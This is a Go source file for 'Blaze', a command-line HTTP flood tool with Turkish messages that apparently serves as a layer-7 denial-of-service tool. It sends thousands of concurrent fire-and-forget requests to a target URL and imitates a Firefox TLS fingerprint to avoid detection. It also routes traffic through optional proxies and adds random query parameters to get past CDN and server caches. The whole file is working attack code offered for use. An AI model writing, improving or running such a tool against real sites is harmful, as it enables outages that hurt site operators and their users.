package main

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

const version = "1.0.0"

const banner = `
  ██████╗ ██╗      █████╗ ███████╗███████╗
  ██╔══██╗██║     ██╔══██╗╚══███╔╝██╔════╝
  ██████╔╝██║     ███████║  ███╔╝ █████╗
  ██╔══██╗██║     ██╔══██║ ███╔╝  ██╔══╝
  ██████╔╝███████╗██║  ██║███████╗███████╗
  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝
`

const (
	cReset  = "\033[0m"
	cRed    = "\033[31m"
	cGreen  = "\033[32m"
	cYellow = "\033[33m"
	cCyan   = "\033[36m"
	cWhite  = "\033[37m"
	cGray   = "\033[90m"
	cBold   = "\033[1m"
)

func usage() {
	fmt.Printf("%s%s%s", cCyan, banner, cReset)
	fmt.Printf("  %sBlaze v%s%s | Firefox 148 TLS | Pipeline Max RPS\n\n", cBold, version, cReset)
	fmt.Printf("  %sKullanim:%s\n", cYellow, cReset)
	fmt.Printf("    blaze <url> <sure_sn> <workers> [method] [proxy]\n\n")
	fmt.Printf("  %sOrnekler:%s\n", cGreen, cReset)
	fmt.Printf("    ./blaze https://hedef.com 60 5000\n")
	fmt.Printf("    ./blaze https://hedef.com 120 8000 GET\n")
	fmt.Printf("    ./blaze https://hedef.com 60 5000 GET socks5://127.0.0.1:1080\n\n")
	fmt.Printf("  %sParametreler:%s\n", cGreen, cReset)
	fmt.Printf("    %-25s Hedef URL\n", "  <url>")
	fmt.Printf("    %-25s Kac saniye calisacak\n", "  <sure_sn>")
	fmt.Printf("    %-25s Pipeline worker sayisi (3000-10000 onerilen)\n", "  <workers>")
	fmt.Printf("    %-25s HTTP method (default: GET)\n", "  [method]")
	fmt.Printf("    %-25s Proxy (http:// veya socks5://)\n\n", "  [proxy]")
}

func main() {
	if len(os.Args) < 4 {
		usage()
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		die("gecersiz sure: %s", os.Args[2])
	}

	workers, err := strconv.Atoi(os.Args[3])
	if err != nil || workers <= 0 {
		die("gecersiz worker sayisi: %s", os.Args[3])
	}

	method := "GET"
	if len(os.Args) >= 5 {
		method = strings.ToUpper(os.Args[4])
	}

	proxyURL := ""
	if len(os.Args) >= 6 {
		proxyURL = os.Args[5]
	}

	run(targetURL, duration, workers, method, proxyURL)
}

func run(targetURL string, duration, workers int, method, proxyURL string) {
	// Max out GOMAXPROCS
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("%s%s%s", cCyan, banner, cReset)
	fmt.Printf("  %sBlaze v%s%s | Firefox 148 TLS | Pipeline Mode\n\n", cBold, version, cReset)

	// Connection pool sizes based on workers
	idlePerHost := workers * 2
	if idlePerHost < 512 {
		idlePerHost = 512
	}
	totalIdle := idlePerHost * 3

	// Build client options
	opts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithDisableRedirects(),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	if proxyURL != "" {
		opts = append(opts, gofire.WithProxy(proxyURL))
	}

	client, err := gofire.Emulate(gofire.Firefox148, opts...)
	if err != nil {
		die("client olusturulamadi: %v", err)
	}
	defer client.Close()

	// Print config
	fmt.Printf("  %s[Hedef]%s       %s\n", cYellow, cReset, targetURL)
	fmt.Printf("  %s[Sure]%s        %ds\n", cYellow, cReset, duration)
	fmt.Printf("  %s[Workers]%s     %d\n", cYellow, cReset, workers)
	fmt.Printf("  %s[Method]%s      %s\n", cYellow, cReset, method)
	fmt.Printf("  %s[Pool]%s        %d idle/host | %d total\n", cYellow, cReset, idlePerHost, totalIdle)
	fmt.Printf("  %s[CPU]%s         %d cores\n", cYellow, cReset, runtime.NumCPU())
	if proxyURL != "" {
		fmt.Printf("  %s[Proxy]%s       %s\n", cYellow, cReset, proxyURL)
	}

	// Pre-warm connections
	fmt.Printf("\n  %s[~]%s Baglanti isitiliyor...\n", cCyan, cReset)
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 15*time.Second)
	warmCount := workers / 10
	if warmCount < 16 {
		warmCount = 16
	}
	if warmCount > 256 {
		warmCount = 256
	}
	_ = client.PreConnect(warmCtx, targetURL, warmCount)
	warmCancel()
	fmt.Printf("  %s[+]%s %d baglanti hazir\n", cGreen, cReset, client.ActiveConnections())

	// Context with duration + signal handling
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Printf("\n  %s[!]%s Durduruluyor...\n", cRed, cReset)
		cancel()
	}()

	// Create pipeline
	pipeline := client.NewPipeline(workers)
	defer pipeline.Close()

	// Stats tracking
	var localSent atomic.Int64
	startTime := time.Now()

	fmt.Printf("  %s[*]%s Basliyor... %d worker pipeline\n\n", cCyan, cReset, workers)

	// Feed goroutines - saturate the pipeline from multiple feeders
	feeders := runtime.NumCPU()
	if feeders < 4 {
		feeders = 4
	}
	if feeders > 32 {
		feeders = 32
	}

	done := make(chan struct{})

	for i := 0; i < feeders; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					url := cacheBust(targetURL)
					pipeline.FireAndForget(ctx, method, url, nil, nil)
					localSent.Add(1)
				}
			}
		}()
	}

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		var lastOK, lastErr int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				ok := pipeline.Stats.TotalOK.Load()
				fail := pipeline.Stats.TotalErr.Load()
				sent := pipeline.Stats.TotalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				remaining := float64(duration) - elapsed
				if remaining < 0 {
					remaining = 0
				}

				currentOK := ok - lastOK
				currentErr := fail - lastErr
				currentRPS := currentOK + currentErr
				lastOK = ok
				lastErr = fail

				if currentRPS > peakRPS {
					peakRPS = currentRPS
				}

				avgRPS := int64(0)
				if elapsed > 0 {
					avgRPS = int64(float64(ok+fail) / elapsed)
				}

				fmt.Printf("\r  %s[*]%s Sent:%s%d%s | OK:%s%d%s | Err:%s%d%s | RPS:%s%d%s | Avg:%s%d%s | Peak:%s%d%s | %s%.0fs%s/%s%.0fs%s   ",
					cCyan, cReset,
					cWhite, sent, cReset,
					cGreen, ok, cReset,
					cRed, fail, cReset,
					cYellow, currentRPS, cReset,
					cCyan, avgRPS, cReset,
					cGreen, peakRPS, cReset,
					cGray, elapsed, cReset,
					cGray, remaining, cReset,
				)
			}
		}
	}()

	// Wait for context to expire
	<-ctx.Done()
	close(done)

	// Let in-flight requests finish
	time.Sleep(2 * time.Second)

	// Final report
	endTime := time.Now()
	totalDuration := endTime.Sub(startTime)
	sent := pipeline.Stats.TotalSent.Load()
	ok := pipeline.Stats.TotalOK.Load()
	fail := pipeline.Stats.TotalErr.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(ok+fail) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	fmt.Printf("\n\n  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", cGray, cReset)
	fmt.Printf("  %s%s[SONUCLAR]%s\n\n", cBold, cGreen, cReset)
	fmt.Printf("    Toplam Gonderilen : %s%d%s\n", cWhite, sent, cReset)
	fmt.Printf("    Basarili          : %s%d%s (%%%.1f)\n", cGreen, ok, cReset, successRate)
	fmt.Printf("    Basarisiz         : %s%d%s\n", cRed, fail, cReset)
	fmt.Printf("    Sure              : %s%v%s\n", cYellow, totalDuration.Round(time.Millisecond), cReset)
	fmt.Printf("    Ortalama RPS      : %s%.0f%s req/s\n", cCyan, avgRPS, cReset)
	fmt.Printf("    Workers           : %s%d%s\n", cGray, workers, cReset)
	fmt.Printf("    Aktif Baglanti    : %s%d%s\n", cGray, client.ActiveConnections(), cReset)
	fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n", cGray, cReset)
}

// cacheBust adds a random query param to bypass CDN/server cache.
var bustParams = []string{"_", "cb", "nc", "t", "v", "r", "ts", "z"}

func cacheBust(base string) string {
	sep := "?"
	if strings.Contains(base, "?") {
		sep = "&"
	}
	return base + sep + bustParams[rand.Intn(len(bustParams))] + "=" + randStr(8)
}

const chars = "abcdefghijklmnopqrstuvwxyz0123456789"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func die(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "  %s[HATA]%s %s\n", cRed, cReset, fmt.Sprintf(format, args...))
	os.Exit(1)
}
